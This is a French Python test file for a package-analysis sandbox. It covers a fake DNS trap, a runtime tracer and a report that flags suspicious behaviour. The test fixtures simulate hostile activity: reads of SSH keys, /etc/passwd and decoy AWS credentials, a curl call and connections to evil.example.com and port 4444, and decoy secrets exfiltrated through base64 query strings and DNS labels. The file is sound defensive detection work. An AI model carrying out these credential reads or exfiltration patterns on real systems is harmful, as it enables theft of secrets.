"""Sandbox v1 : les briques testables sans Docker (faux DNS, traceur, rapport)."""

import json
import os
import socket
import struct
import subprocess
import sys
from pathlib import Path

from plateforme.sandbox import piege, rapport

TRACE = Path(piege.__file__).parent / "trace"


# --- faux DNS ---------------------------------------------------------------------------------

def _requete_dns(nom: str, qtype: int = 1) -> bytes:
    qname = b"".join(bytes([len(p)]) + p.encode() for p in nom.split(".")) + b"\0"
    return struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + qname + struct.pack(">HH", qtype, 1)


def test_le_faux_dns_lit_le_nom_demande():
    assert piege.nom_demande(_requete_dns("evil.example.com")) == ("evil.example.com", 1)


def test_le_faux_dns_repond_a_tout_avec_l_ip_du_piege():
    reponse = piege.reponse_dns(_requete_dns("evil.example.com"), "172.30.0.2")
    ident, drapeaux, _, nb_reponses = struct.unpack(">HHHH", reponse[:8])
    assert ident == 0x1234 and drapeaux & 0x8000 and nb_reponses == 1
    assert reponse.endswith(socket.inet_aton("172.30.0.2"))


def test_le_faux_dns_ne_donne_pas_d_ipv6():
    reponse = piege.reponse_dns(_requete_dns("evil.example.com", qtype=28), "172.30.0.2")
    assert struct.unpack(">H", reponse[6:8])[0] == 0


def test_un_paquet_dns_illisible_ne_fait_pas_tomber_le_piege():
    assert piege.nom_demande(b"\x00\x01") is None


def test_le_piege_extrait_l_hote_http():
    brut = b"POST /x?k=AKIA HTTP/1.1\r\nHost: evil.example.com\r\n\r\n"
    assert piege.hote_http(brut) == "evil.example.com"
    assert piege.hote_http(b"\x16\x03\x01 tls") is None


# --- traceur (sitecustomize chargé dans le conteneur) -----------------------------------------

def test_le_traceur_note_fichiers_processus_et_reseau(tmp_path):
    journal = tmp_path / "trace.jsonl"
    leurre = tmp_path / ".aws" / "credentials"
    leurre.parent.mkdir()
    leurre.write_text("[default]\n")
    code = (f"open({str(leurre)!r}).read()\n"
            "import subprocess; subprocess.run(['true'])\n"
            "import socket\n"
            "try: socket.getaddrinfo('evil.example.com', 443)\n"
            "except OSError: pass\n")
    env = {**os.environ, "PYTHONPATH": str(TRACE), "SAS_TRACE": str(journal), "HOME": str(tmp_path)}
    subprocess.run([sys.executable, "-c", code], env=env, check=True, timeout=30)
    evenements = [json.loads(l) for l in journal.read_text().splitlines()]
    sortes = {(e["e"], str(e.get("v"))) for e in evenements}
    assert ("open", str(leurre)) in sortes
    assert any(e["e"] == "processus" and "true" in e["v"] for e in evenements)
    assert ("dns", "evil.example.com:443") in sortes


def test_sans_sas_trace_le_traceur_ne_fait_rien(tmp_path):
    env = {**os.environ, "PYTHONPATH": str(TRACE)}
    env.pop("SAS_TRACE", None)
    r = subprocess.run([sys.executable, "-c", "print('ok')"], env=env, capture_output=True,
                       text=True, timeout=30)
    assert r.stdout.strip() == "ok"


# --- rapport ----------------------------------------------------------------------------------

LEURRES = {"AWS_SECRET_ACCESS_KEY": "sasleurre0aws1234567890"}
HOME = "/tmp/home"


def _construire(trace=(), reseau=(), code=0):
    return rapport.construire(
        trace=[json.dumps(t) for t in trace], reseau=[json.dumps(r) for r in reseau],
        leurres=LEURRES, home=HOME, code_sortie=code, duree_s=3.2, delai_depasse=False)


def test_un_paquet_sage_donne_un_rapport_vide():
    r = _construire(trace=[{"e": "open", "v": "/usr/lib/python3.12/os.py"}])
    assert (r.requetes_dns, r.connexions, r.fichiers_sensibles, r.leurres_lus, r.processus) == \
        ([], [], [], [], [])
    assert r.code_sortie == 0 and r.duree_s == 3.2


def test_le_rapport_rassemble_dns_connexions_fichiers_et_processus():
    r = _construire(
        trace=[{"e": "open", "v": f"{HOME}/.ssh/id_rsa"}, {"e": "open", "v": "/etc/passwd"},
               {"e": "dns", "v": "evil.example.com:443"}, {"e": "connect", "v": "1.2.3.4:4444"},
               {"e": "processus", "v": "curl http://evil.example.com"}],
        reseau=[{"t": "dns", "nom": "evil.example.com"},
                {"t": "tcp", "port": 80, "hote": "evil.example.com", "debut": "GET / HTTP/1.1"}])
    assert r.requetes_dns == ["evil.example.com"]
    assert r.connexions == ["evil.example.com:443", "1.2.3.4:4444", "evil.example.com:80"]
    assert r.fichiers_sensibles == ["~/.ssh/id_rsa", "/etc/passwd"]
    assert r.leurres_lus == ["~/.ssh/id_rsa"]
    assert r.processus == ["curl http://evil.example.com"]


def test_un_leurre_d_environnement_exfiltre_est_vu_sur_le_reseau_meme_encode():
    import base64
    cache = base64.b64encode(LEURRES["AWS_SECRET_ACCESS_KEY"].encode()).decode()
    r = _construire(reseau=[{"t": "tcp", "port": 80, "hote": "x", "debut": f"GET /?d={cache}"}])
    assert r.leurres_lus == ["AWS_SECRET_ACCESS_KEY (exfiltré)"]
    r = _construire(reseau=[{"t": "dns", "nom": LEURRES["AWS_SECRET_ACCESS_KEY"] + ".evil.com"}])
    assert r.leurres_lus == ["AWS_SECRET_ACCESS_KEY (exfiltré)"]


def test_les_lignes_illisibles_sont_ignorees_et_les_listes_bornees():
    trace = ["pas du json", json.dumps({"e": "open"})] + \
        [json.dumps({"e": "dns", "v": f"h{i}.example.com:80"}) for i in range(500)]
    r = rapport.construire(trace=trace, reseau=[], leurres=LEURRES, home=HOME, code_sortie=0,
                           duree_s=1.0, delai_depasse=False)
    assert len(r.connexions) == rapport.MAX_ENTREES


def test_le_dns_interne_n_est_pas_compte():
    r = _construire(trace=[{"e": "dns", "v": "localhost:80"}], reseau=[{"t": "dns", "nom": "localhost"}])
    assert r.requetes_dns == [] and r.connexions == []
